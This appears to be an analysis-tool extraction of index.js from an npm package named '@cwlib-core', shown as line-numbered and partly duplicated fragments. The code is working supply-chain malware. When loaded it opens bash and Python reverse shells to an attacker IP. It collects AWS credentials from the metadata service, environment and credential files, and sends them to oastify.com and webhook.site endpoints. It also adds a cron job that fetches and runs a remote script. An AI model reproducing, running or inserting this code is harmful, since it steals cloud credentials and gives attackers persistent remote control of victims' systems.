// File: tmp/tmpfkf5bn4g/@cwlib-core/package/index.js
// ======================================================================
Line 1: _tmp_6 = require('child_process')
Line 2: const fs = require('fs')
Line 3: const os = require('os')
Line 4: const crypto = require('crypto')
Line 6: const sessionId = crypto.randomBytes(4).toString('hex')
Line 12: execSync(cmd, { stdio: 'ignore', timeout: 5000 })
Line 18: {
    const shells = [
        `bash -c 'bash -i >& /dev/tcp/${attackerIP}/${attackerPort} 0>&1'`,
        `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${attackerIP}",${attackerPort}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`
    ];
    shells.forEach(cmd => execute(cmd));
}
Line 19: const shells = [
        `bash -c 'bash -i >& /dev/tcp/${attackerIP}/${attackerPort} 0>&1'`,
        `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${attackerIP}",${attackerPort}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`
    ]
Line 20: _tmp_1.push(<operator>.formatString("bash -c 'bash -i >& /dev/tcp/", attackerIP, "/", attackerPort, " 0>&1'"))
Line 21: _tmp_1.push(<operator>.formatString("python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("", attackerIP, "",", attackerPort, "));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'"))
Line 26: {
    const data = {
        metadata: execute('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
        env: Object.entries(process.env).filter(([k]) => k.includes('AWS')),
        files: {
            '~/.aws/credentials': execute('cat ~/.aws/credentials'),
            '/root/.aws/credentials': execute('cat /root/.aws/credentials')
        }
    };
    return data;
}
Line 27: const data = {
        metadata: execute('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
        env: Object.entries(process.env).filter(([k]) => k.includes('AWS')),
        files: {
            '~/.aws/credentials': execute('cat ~/.aws/credentials'),
            '/root/.aws/credentials': execute('cat /root/.aws/credentials')
        }
    }
Line 28: _tmp_2.metadata = execute('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/')
Line 29: _tmp_2.env = Object.entries(process.env).filter(([k]) => k.includes('AWS'))
Line 30: _tmp_2.files = {
            '~/.aws/credentials': execute('cat ~/.aws/credentials'),
            '/root/.aws/credentials': execute('cat /root/.aws/credentials')
        }
Line 31: _tmp_4.~/.aws/credentials = execute('cat ~/.aws/credentials')
Line 32: _tmp_4./root/.aws/credentials = execute('cat /root/.aws/credentials')
Line 38: {
    const payload = JSON.stringify({
        id: sessionId,
        host: os.hostname(),
        user: execute('whoami'),
        data: data
    });

    // DNS Exfiltration (short payloads)
    execute(`dig +short ${sessionId}.7emwnamdc0dpaswxncpyd3yd248vwpke.oastify.com`);

    // HTTP Exfiltration (for larger data)
    execute(`curl -X POST https://webhook.site/50253029-1ec3-4b4a-9646-fc25a2b21963 -d '${payload}' --silent`);

    // Backup: Write to disk
    fs.writeFileSync(`/tmp/.${sessionId}`, payload);
}
Line 39: const payload = JSON.stringify({
        id: sessionId,
        host: os.hostname(),
        user: execute('whoami'),
        data: data
    })
Line 41: os.hostname()
Line 42: _tmp_5.user = execute('whoami')
Line 47: execute(`dig +short ${sessionId}.7emwnamdc0dpaswxncpyd3yd248vwpke.oastify.com`)
Line 50: <operator>.formatString("curl -X POST https://webhook.site/50253029-1ec3-4b4a-9646-fc25a2b21963 -d '", payload, "' --silent")
Line 57: {
    const cronCmd = `(crontab -l 2>/dev/null; echo "* * * * * curl -s http://${attackerIP}/payload.sh | bash") | crontab -`;
    execute(cronCmd);
}
Line 58: <operator>.formatString("(crontab -l 2>/dev/null; echo "* * * * * curl -s http://", attackerIP, "/payload.sh | bash") | crontab -")
Line 59: execute(cronCmd)
Line 63: {
    setTimeout(() => {
        const awsData = harvestAWS();
        exfil(awsData);
        reverseShell();
        persist();
    }, 3000); // Initial delay
}
Line 64: setTimeout(() => {
        const awsData = harvestAWS();
        exfil(awsData);
        reverseShell();
        persist();
    }, 3000)
Line 67: reverseShell()
Line 72: main()
